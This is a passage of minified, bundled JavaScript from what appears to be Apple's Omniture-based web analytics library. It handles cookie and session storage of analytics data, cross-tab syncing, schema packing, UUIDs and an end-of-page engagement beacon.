null!==data},sessionDataUnpacked=has(sessionData)?(0,_index2.unpack)({schema:schema,data:sessionData}):null,cookieDataUnpacked=has(cookieData)?(0,_index2.unpack)({schema:schema,data:cookieData}):null,sessionId=has(sessionDataUnpacked)?(0,_utils.readUuid)(sessionDataUnpacked.uuid):null,cookieId=has(cookieDataUnpacked)?(0,_utils.readUuid)(cookieDataUnpacked.uuid):null,bothHaveData=has(sessionData)&&has(cookieData),globalsMatch=has(sessionId)&&has(cookieId)&&sessionId.global===cookieId.global,idsMatch=globalsMatch&&sessionId.session===cookieId.session;switch(!0){case!has(sessionData)&&has(cookieData):result=cookieDataUnpacked;break;case has(sessionData)&&!has(cookieData):result=sessionDataUnpacked;break;case bothHaveData&&idsMatch:result=_objectSpread(_objectSpread({},sessionDataUnpacked),cookieDataUnpacked);break;case bothHaveData&&!idsMatch&&globalsMatch:var syncableCookieData=_objectSpread({},cookieDataUnpacked);schema.data.filter((function(_ref2){return!_ref2.syncTabs})).forEach((function(_ref3){var key=_ref3.key;delete syncableCookieData[key]})),result=_objectSpread(_objectSpread({},sessionDataUnpacked),syncableCookieData);break;case bothHaveData&&!globalsMatch:result=sessionDataUnpacked;case!has(sessionData)&&!has(cookieData):}return result},retrieve=exports.retrieve=function retrieve(_ref4){var window=_ref4.window,cookie=_ref4.cookie,state=(0,_index.loadSchema)({options:{}});if(state.allSchemas){for(var keys=Object.keys(state.allSchemas).sort((function(a,b){return a<b?1:-1})),data={},s=0;s<keys.length;s++){var currentSchemaKey=keys[s],schema=state.allSchemas[currentSchemaKey],_schema$settings=schema.settings,cookieName=_schema$settings.cookieName,sessionName=_schema$settings.sessionName,cookieData=(0,_load.loadCookie)({cookie:cookie,key:cookieName}),sessionData=(0,_load.loadSession)({window:window,key:sessionName}),merged=mergeData({schema:schema,cookieData:cookieData,sessionData:sessionData});if(null!==merged&&(data=merged),0!==Object.keys(data).length)break}return 0===Object.keys(data).length?null:data}},clear=exports.clear=function clear(){var _ref5=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},window=_ref5.window,cookie=_ref5.cookie,_ref5$options=_ref5.options,options=void 0===_ref5$options?{}:_ref5$options,state={window:window,cookie:cookie,options:options};if(!(state=(0,_index.loadSchema)(state)).allSchemas)return null;var previous=retrieve({window:window,cookie:cookie});Object.values(state.allSchemas).forEach((function(_ref6){var settings=_ref6.settings,cookieName=settings.cookieName,sessionName=settings.sessionName,cookieArgs={cookie:cookie,key:cookieName};state.options&&state.options.cookieDomain&&(cookieArgs.cookieDomain=state.options.cookieDomain),(0,_clear.clearCookie)(cookieArgs),(0,_clear.clearSession)({window:window,key:sessionName}),(0,_syncTabs.syncClearAll)({window:window})})),previous&&previous.uuid&&(0,_utils.pipe)(_setDefaults.setDefaults,_index.loadSchema,_index2.pack,store)({window:window,cookie:cookie,data:{uuid:previous.uuid},options:options})};exports.storage={store:store,retrieve:retrieve,clear:clear}},{"../schema/index.js":75,"../setDefaults.js":77,"../transformers/index.js":84,"../utils.js":87,"./clear.js":78,"./load.js":80,"./save.js":81,"./syncTabs.js":82}],80:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.loadSession=exports.loadCookie=void 0;exports.loadCookie=function loadCookie(_ref){var key=_ref.key,cookie=_ref.cookie;return cookie?cookie.get(key):null},exports.loadSession=function loadSession(_ref2){var key=_ref2.key,window=_ref2.window;return window&&window.sessionStorage?window.sessionStorage.getItem(key):null}},{}],81:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.saveSession=exports.saveLocal=exports.saveCookie=void 0;exports.saveCookie=function saveCookie(_ref){var key=_ref.key,value=_ref.value,cookieDomain=_ref.cookieDomain,cookie=_ref.cookie,options={secure:!0,sameSite:"strict",path:"/"};cookieDomain&&(options.domain=cookieDomain),cookie.set(key,value,options)},exports.saveSession=function saveSession(_ref2){var key=_ref2.key,value=_ref2.value;_ref2.window.sessionStorage.setItem(key,value)},exports.saveLocal=function saveLocal(_ref3){var key=_ref3.key,value=_ref3.value;_ref3.window.localStorage.setItem(key,value)}},{}],82:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.syncSave=exports.syncClearAll=exports.handleStorageEvent=exports.handleNewPage=exports.SYNC=exports.NEW_PAGE=exports.CLEAR_ALL=void 0;var _index=require("../transformers/index.js"),_utils=require("../utils.js"),_load=require("./load.js"),_save=require("./save.js"),_clear=require("./clear.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var SYNC=exports.SYNC="sync",NEW_PAGE=exports.NEW_PAGE="onNewPage",CLEAR_ALL=exports.CLEAR_ALL="clearAll";exports.handleStorageEvent=function handleStorageEvent(_ref){var schema=_ref.schema,window=_ref.window;return function(event){var key=schema.settings.sessionName;switch(event.key){case NEW_PAGE:var localSessionValue=(0,_load.loadSession)({window:window,key:key}),unpacked=(0,_index.unpack)({schema:schema,data:localSessionValue}),value=(0,_index.pack)({schema:schema,data:unpacked,isSync:!0}).transformedSync;value&&((0,_save.saveLocal)({window:window,key:SYNC,value:value}),(0,_clear.clearLocal)({window:window,key:SYNC}));break;case SYNC:if(event.newValue){var _localSessionValue=(0,_load.loadSession)({window:window,key:key}),_value=event.newValue;if(_localSessionValue){var unpackedLocal=(0,_index.unpack)({schema:schema,data:_localSessionValue}),unpackedOther=(0,_index.unpack)({schema:schema,data:event.newValue}),localUUID=(0,_utils.readUuid)(unpackedLocal.uuid),otherUUID=(0,_utils.readUuid)(unpackedOther.uuid),uuid=localUUID.global===otherUUID.global?unpackedLocal.uuid:unpackedOther.uuid;schema.data.forEach((function(item){item.syncTabs&&delete unpackedLocal[item.key]}));var mixedData=_objectSpread(_objectSpread(_objectSpread({},unpackedLocal),unpackedOther),{},{uuid:uuid});_value=(0,_index.pack)({schema:schema,data:mixedData,isSync:!0}).transformed}(0,_save.saveSession)({window:window,key:key,value:_value})}break;case CLEAR_ALL:(0,_clear.clearSession)({window:window,key:key})}}},exports.handleNewPage=function handleNewPage(){var window=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).window;(0,_save.saveLocal)({window:window,key:NEW_PAGE,value:"handle-new-page-save"}),(0,_clear.clearLocal)({window:window,key:NEW_PAGE})},exports.syncSave=function syncSave(_ref3){var value=_ref3.value,window=_ref3.window;(0,_save.saveLocal)({window:window,key:SYNC,value:value}),(0,_clear.clearLocal)({window:window,key:SYNC})},exports.syncClearAll=function syncClearAll(){var window=(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{}).window;(0,_save.saveLocal)({window:window,key:CLEAR_ALL,value:"sync-clear-all"}),(0,_clear.clearLocal)({window:window,key:CLEAR_ALL})}},{"../transformers/index.js":84,"../utils.js":87,"./clear.js":78,"./load.js":80,"./save.js":81}],83:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.compress=void 0;var _utils=require("../utils.js");function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}var pack=function pack(state){var data=[],dataSync=[],separator=state.schema.settings.separator;if(state.transformed&&Object.entries(state.transformed).forEach((function(_ref){var _ref2=_slicedToArray(_ref,2),key=_ref2[0],value=_ref2[1];data.push(key+separator+value)})),state.transformedSync&&Object.entries(state.transformedSync).forEach((function(_ref3){var _ref4=_slicedToArray(_ref3,2),key=_ref4[0],value=_ref4[1];dataSync.push(key+separator+value)})),state.transformed=data.join(separator),state.transformedSync=dataSync.join(separator),""===state.transformed)return state;if(state.schema.prefix){var transformed=[state.schema.prefix,separator,state.transformed];if(state.transformed=transformed.join(""),""!==state.transformedSync){var transformedSync=[state.schema.prefix,separator,state.transformedSync];state.transformedSync=transformedSync.join("")}}return state},unpack=function unpack(state){var data=state.data,schema=state.schema,separator=schema.settings.separator,raw=data;if(null===raw)return state;for(var re=new RegExp("^".concat(schema.prefix).concat((0,_utils.reSafe)(separator))),parts=(raw=raw.replace(re,"")).split(schema.settings.separator),unpackedData={},i=0;i<parts.length;i+=2){var key=parts[i],value=parts[i+1];unpackedData[key]=value}return state.data=unpackedData,state};exports.compress=function compress(isPacking){return isPacking?pack:unpack}},{"../utils.js":87}],84:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.unpack=exports.pack=void 0;var _utils=require("../utils.js"),_mergeExisting=require("./mergeExisting.js"),_mapToSchema=require("./mapToSchema.js"),_compress=require("./compress.js");function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}var transformers={mergeExisting:_mergeExisting.mergeExisting,mapToSchema:_mapToSchema.mapToSchema,compress:_compress.compress},transform=function transform(isPacking){return function(state){if(!state||!state.schema)return null;var transformFunctions=state.schema.settings.transformers.map(function mapTransform(isPacking){return function(name){return transformers[name](isPacking)}}(isPacking)),ordered=isPacking?transformFunctions:_toConsumableArray(transformFunctions).reverse();return _utils.pipe.apply(void 0,_toConsumableArray(ordered))(state)}};exports.pack=transform(!0),exports.unpack=transform(!1)},{"../utils.js":87,"./compress.js":83,"./mapToSchema.js":85,"./mergeExisting.js":86}],85:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.mapToSchema=void 0;var _utils=require("../utils.js"),pack=function pack(state){var schema=state.schema;return state.transformed={},state.transformedSync={},state.destination=state.options&&"cross"===state.options.origin?"cookie":"session",null===state.data||(!state.data.hasOwnProperty("minor")&&state.options&&state.options.hasOwnProperty("minor")&&(state.data.minor=state.options.minor),schema.data.forEach((function(_ref){var key=_ref.key,map=_ref.map,validStorage=_ref.validStorage,clean=_ref.clean,_ref$prePack=_ref.prePack,prePack=void 0===_ref$prePack?_utils.identity:_ref$prePack,_ref$syncTabs=_ref.syncTabs,syncTabs=void 0!==_ref$syncTabs&&_ref$syncTabs;if(validStorage.includes(state.destination)&&state.data[key]){var raw=state.data[key],value=(0,_utils.pipe)(prePack,clean)(raw);if(value&&""!==value)if(state.transformed[map]=value,syncTabs)state.transformedSync[map]=value;else if("uuid"===key){var global=(0,_utils.readUuid)(value).global;state.transformedSync[map]=(0,_utils.uuid)(global)}}}))),state},unpack=function unpack(state){var data={};return state.data&&null!==state.data?(Object.keys(state.data).forEach((function(raw){var result=state.schema.data.find((function(item){return item.map===raw}));if(result){var key=result.key,postPack=result.postPack,value=state.data[raw];data[key]=postPack?postPack(value):value}})),0===Object.keys(data).length?null:data):null};exports.mapToSchema=function mapToSchema(isPacking){return isPacking?pack:unpack}},{"../utils.js":87}],86:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.mergeExisting=void 0;var _analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_utils=require("../utils.js"),_index=require("../storage/index.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}var pack=function pack(state){var storedData=_index.storage.retrieve({window:state.window,cookie:state.cookie});return storedData?mergeStateWithStoredData(state,storedData):state.data&&(state.data.uuid||addNewUuid(state)),state},mergeStateWithStoredData=function mergeStateWithStoredData(state,storedData){Object.keys(storedData).forEach((function(key){var storedValue=storedData[key],newValue=state.data[key],mergePolicy=getMergePolicy(state,key);state.data[key]=mergeValuesByPolicy({storedValue:storedValue,newValue:newValue,mergePolicy:mergePolicy})}))},addNewUuid=function addNewUuid(state){state.data.uuid=(0,_utils.uuid)()},mergeValuesByPolicy=function mergeValuesByPolicy(_ref){var storedValue=_ref.storedValue,newValue=_ref.newValue;switch(_ref.mergePolicy){case"keep":return storedValue;case"override":return newValue||storedValue;case"append":return append(newValue,storedValue);case"merge":return merge(newValue,storedValue);default:return newValue}},getMergePolicy=function getMergePolicy(state,key){return state.isSync?"override":getMergePolicyFromSchema(state.schema,key)},getMergePolicyFromSchema=function getMergePolicyFromSchema(schema,key){return schema.data.find((function(item){return item.key===key})).mergeDefault},append=function append(newValue,storedValue){return newValue?storedValue.concat(newValue):storedValue},merge=function merge(newValue,storedValue){return _objectSpread(_objectSpread(_objectSpread({},storedValue),newValue),mergedCollections(newValue,storedValue))},mergedCollections=function mergedCollections(newValue,storedValue){var merged={};if(newValue&&storedValue){var mergeCollection=function mergeCollection(key,parse){if(storedValue[key]&&newValue[key]){var parsedStored=parse(storedValue[key]),parsedNew=parse(newValue[key]);merged[key]=parsedStored.merge(parsedNew).toString()}};return mergeCollection(_analyticsOmnitureConstants.VARS.EVENTS,_analyticsOmnitureCollection.parseEventCollectionString),mergeCollection(_analyticsOmnitureConstants.VARS.PRODUCTS,_analyticsOmnitureCollection.parseProductCollectionString),merged}},unpack=function unpack(x){return x};exports.mergeExisting=function mergeExisting(isPacking){return isPacking?pack:unpack}},{"../storage/index.js":79,"../utils.js":87,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115}],87:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.uuid=exports.readUuid=exports.reSafe=exports.pipe=exports.identity=void 0;exports.identity=function identity(x){return x},exports.pipe=function pipe(){for(var _len=arguments.length,fns=new Array(_len),_key=0;_key<_len;_key++)fns[_key]=arguments[_key];return function(value){return fns.reduce((function(result,currentFn){return currentFn(result)}),value)}},exports.reSafe=function reSafe(str){return str.replace(/[|\\{}()[\]^$+*?.]/g,"\\$&")};var generateUUID=function generateUUID(){return Math.random().toString(36).slice(2,6)};exports.uuid=function uuid(){return(arguments.length>0&&void 0!==arguments[0]?arguments[0]:generateUUID()).slice(0,4)+generateUUID()},exports.readUuid=function readUuid(id){return{global:id.slice(0,4),session:id.slice(4)}}},{}],88:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.state=void 0;exports.state={engagementObserver:{},onPageEnd:function onPageEnd(){},element:null}},{}],89:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.endOfPage=void 0;var _config=require("./config.js"),_init=require("./init.js"),initDone=!1;exports.endOfPage=function endOfPage(){var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},element=_ref.element,onPageEnd=_ref.onPageEnd;element instanceof HTMLElement&&(initDone||(_config.state.element=element,"function"==typeof onPageEnd&&(_config.state.onPageEnd=onPageEnd),(0,_init.init)({element:element}),initDone=!0))}},{"./config.js":88,"./init.js":91}],90:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"endOfPage",{enumerable:!0,get:function get(){return _endOfPage.endOfPage}}),Object.defineProperty(exports,"update",{enumerable:!0,get:function get(){return _update.update}});var _endOfPage=require("./endOfPage.js"),_update=require("./update.js")},{"./endOfPage.js":89,"./update.js":93}],91:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.init=void 0;var _config=require("./config.js"),_onEngaged=require("./onEngaged.js");exports.init=function init(_ref){var element=_ref.element;_config.state.engagementObserver=new IntersectionObserver(_onEngaged.onEngaged),_config.state.engagementObserver.observe(element)}},{"./config.js":88,"./onEngaged.js":92}],92:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.onEngaged=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection"),_analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_config=require("./config.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}exports.onEngaged=function onEngaged(entries){if(!(entries[0].intersectionRatio<=0)){var beacon=_defineProperty({},_analyticsOmnitureConstants.VARS.EVENTS,new _analyticsOmnitureCollection.OmnitureCollection(new _analyticsOmnitureCollection.OmnitureEvent([_analyticsOmnitureConstants.EVENTS.EVENT_406])));_config.state.onPageEnd({beacon:beacon}),_config.state.engagementObserver.disconnect()}}},{"./config.js":88,"@apple/analytics-omniture-collection":105,"@apple/analytics-omniture-constants":115}],93:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.update=void 0;var _config=require("./config.js"),_init=require("./init.js");exports.update=function update(){_config.state.element instanceof HTMLElement&&(_config.state.engagementObserver.disconnect(),(0,_init.init)({element:_config.state.element}))}},{"./config.js":88,"./init.js":91}],94:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"merge",{enumerable:!0,get:function get(){return _merge.merge}}),exports.mergers=void 0;var _merge=require("./merge.js"),mergers=function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||"object"!=_typeof(e)&&"function"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}(require("./mergers.js"));function _getRequireWildcardCache(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function _getRequireWildcardCache(e){return e?t:r})(e)}exports.mergers=mergers},{"./merge.js":95,"./mergers.js":96}],95:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.merge=void 0;var _analyticsOmnitureCollection=require("@apple/analytics-omniture-collection");exports.merge=function merge(_ref){var _ref$target=_ref.target,target=void 0===_ref$target?{}:_ref$target,_ref$source=_ref.source,source=void 0===_ref$source?{}:_ref$source,_ref$mergers=_ref.mergers,mergers=void 0===_ref$mergers?{}:_ref$mergers;return Object.keys(source).forEach((function(key){mergers[key]?target[key]=mergers[key](target[key],source[key]):target[key]instanceof _analyticsOmnitureCollection.OmnitureCollection&&source[key]instanceof _analyticsOmnitureCollection.OmnitureCollection?target[key].merge(source[key]):target[key]=source[key]})),target}},{"@apple/analytics-omniture-collection":105}],96:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.targetPlusSource=exports.targetOrSource=exports.targetMergeSource=exports.targetAndSource=exports.target=exports.sourcePlusTarget=exports.sourceOrTarget=exports.sourceMergeTarget=exports.sourceAndTarget=exports.source=void 0;exports.target=function target(_target){return _target},exports.source=function source(_,_source){return _source},exports.targetOrSource=function targetOrSource(target,source){return target||source},exports.sourceOrTarget=function sourceOrTarget(target,source){return source||target},exports.targetAndSource=function targetAndSource(target,source){return target&&source},exports.sourceAndTarget=function sourceAndTarget(target,source){return source&&target},exports.targetPlusSource=function targetPlusSource(target,source){return target+source},exports.sourcePlusTarget=function sourcePlusTarget(target,source){return source+target},exports.targetMergeSource=function targetMergeSource(target,source){return target.merge(source)},exports.sourceMergeTarget=function sourceMergeTarget(target,source){return source.merge(target)}},{}],97:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.flattenMergeInput=exports.default=void 0;var _index=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../OmnitureItem/index.js")),_config=require("../config.js");function _defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,(arg=descriptor.key,key=void 0,key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string"),"symbol"===_typeof(key)?key:String(key)),descriptor)}var arg,key}function _createSuper(Derived){var hasNativeReflectConstruct=_isNativeReflectConstruct();return function _createSuperInternal(){var result,Super=_getPrototypeOf(Derived);if(hasNativeReflectConstruct){var NewTarget=_getPrototypeOf(this).constructor;result=Reflect.construct(Super,arguments,NewTarget)}else result=Super.apply(this,arguments);return function _possibleConstructorReturn(self,call){if(call&&("object"===_typeof(call)||"function"==typeof call))return call;if(void 0!==call)throw new TypeError("Derived constructors may only return object or undefined");return function _assertThisInitialized(self){if(void 0===self)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return self}(self)}(this,result)}}function _wrapNativeSuper(Class){var _cache="function"==typeof Map?new Map:void 0;return _wrapNativeSuper=function _wrapNativeSuper(Class){if(null===Class||!function _isNativeFunction(fn){try{return-1!==Function.toString.call(fn).indexOf("[native code]")}catch(e){return"function"==typeof fn}}(Class))return Class;if("function"!=typeof Class)throw new TypeError("Super expression must either be null or a function");if(void 0!==_cache){if(_cache.has(Class))return _cache.get(Class);_cache.set(Class,Wrapper)}function Wrapper(){return _construct(Class,arguments,_getPrototypeOf(this).constructor)}return Wrapper.prototype=Object.create(Class.prototype,{constructor:{value:Wrapper,enumerable:!1,writable:!0,configurable:!0}}),_setPrototypeOf(Wrapper,Class)},_wrapNativeSuper(Class)}function _construct(Parent,args,Class){return _construct=_isNativeReflectConstruct()?Reflect.construct.bind():function _construct(Parent,args,Class){var a=[null];a.push.apply(a,args);var instance=new(Function.bind.apply(Parent,a));return Class&&_setPrototypeOf(instance,Class.prototype),instance},_construct.apply(null,arguments)}function _isNativeReflectConstruct(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}function _setPrototypeOf(o,p){return _setPrototypeOf=Object.setPrototypeOf?Object.setPrototypeOf.bind():function _setPrototypeOf(o,p){return o.__proto__=p,o},_setPrototypeOf(o,p)}function _getPrototypeOf(o){return _getPrototypeOf=Object.setPrototypeOf?Object.getPrototypeOf.bind():function _getPrototypeOf(o){return o.__proto__||Object.getPrototypeOf(o)},_getPrototypeOf(o)}function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}var flattenMergeInput=exports.flattenMergeInput=function flattenMergeInput(){for(var _len=arguments.length,items=new Array(_len),_key=0;_key<_len;_key++)items[_key]=arguments[_key];return items.reduce((function(acc,item){return item instanceof OmnitureCollection?acc.push.apply(acc,_toConsumableArray(item.values())):acc.push(item),acc}),[]).filter((function(item){return item instanceof _index.default}))},OmnitureCollection=function(_Map){!function _inherits(subClass,superClass){if("function"!=typeof superClass&&null!==superClass)throw new TypeError("Super expression must either be null or a function");subClass.prototype=Object.create(superClass&&superClass.prototype,{constructor:{value:subClass,writable:!0,configurable:!0}}),Object.defineProperty(subClass,"prototype",{writable:!1}),superClass&&_setPrototypeOf(subClass,superClass)}(OmnitureCollection,_Map);var _super=_createSuper(OmnitureCollection);function OmnitureCollection(){var _this2,_this;return function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}(this,OmnitureCollection),(_this2=_this=_super.call(this)).merge.apply(_this2,arguments),_this}return function _createClass(Constructor,protoProps,staticProps){return 